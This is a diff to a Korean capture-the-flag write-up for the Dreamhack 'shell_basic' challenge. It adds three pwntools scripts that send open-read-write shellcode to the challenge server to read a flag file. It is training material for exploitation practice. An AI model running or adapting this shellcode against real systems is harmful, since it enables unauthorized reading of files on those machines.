@@ -147,7 +147,55 @@ start:
 5. 이후 과정은 python 파일 작성 부분으로 풀이 방법 1과 동일
 
 ## 풀이방법 3. pwntools의 shellcraft를 사용
+1.
+```
+from pwn import *
 
+context.arch = "amd64"
+p = remote("host3.dreamhack.games", 24520)
+
+r = "/home/shell_basic/flag_name_is_loooooong"
+
+shellcode = shellcraft.open(r)
+shellcode += shellcraft.read("rax", "rsp", 0x30)
+shellcode += shellcraft.write(1, "rsp", 0x30)
+shellcode = asm(shellcode)
+
+p.sendlineafter('shellcode: ', shellcode)
+
+print(p.recvuntil(b'}'))
+```
+2.
+```
+from pwn import *
+
+context.arch = "amd64"
+p = remote("host3.dreamhack.games", 24520)
+
+r = "/home/shell_basic/flag_name_is_loooooong"
+
+shellcode = shellcraft.pushstr(r)
+shellcode += shellcraft.open("rsp", 0, 0)
+shellcode += shellcraft.read("rax", "rsp", 0x30)
+shellcode += shellcraft.write(1, "rsp", 0x30)
+shellcode = asm(shellcode)
+
+p.sendlineafter('shellcode: ', shellcode)
+
+print(p.recvuntil(b'}'))
+```
+3.
+```
+from pwn import *
+
+context.arch = "amd64"
+p = remote("host3.dreamhack.games", 24520)
+
+shellcode = asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong"))
+
+p.sendlineafter(b'shellcode: ', shellcode)
+print(p.recvuntil(b'}'))
+```
 ### 참고 정리
 
 - `orw.c->orw` : `gcc -o orw orw.c` 
